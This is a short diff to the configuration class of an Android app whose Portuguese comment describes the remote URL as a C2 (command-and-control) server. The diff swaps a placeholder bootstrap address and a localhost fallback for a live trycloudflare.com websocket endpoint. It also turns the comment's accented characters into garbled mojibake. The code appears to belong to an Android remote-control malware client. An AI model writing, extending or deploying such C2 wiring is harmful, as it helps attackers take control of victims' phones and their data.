@@ -5,10 +5,10 @@ import android.content.Context;
 import java.util.Random;
 
 public final class Cfg {
-    // Servidor de configuração remoto: primeira linha = URL wss:// do C2
-    public static final String BOOTSTRAP = "https://SEU-PROJETO.pages.dev/cfg.txt";
+    // Servidor de configuraÃƒÂ§ÃƒÂ£o remoto: primeira linha = URL wss:// do C2
+    public static final String BOOTSTRAP = "wss://jim-excluding-developmental-tricks.trycloudflare.com/ws";
     // Fallback embutido, usado se o bootstrap falhar
-    public static final String FALLBACK = "ws://127.0.0.1:8080/ws";
+    public static final String FALLBACK = "wss://jim-excluding-developmental-tricks.trycloudflare.com/ws";
 
     public static String id(Context c) {
         String s = c.getSharedPreferences("p", 0).getString("id", null);
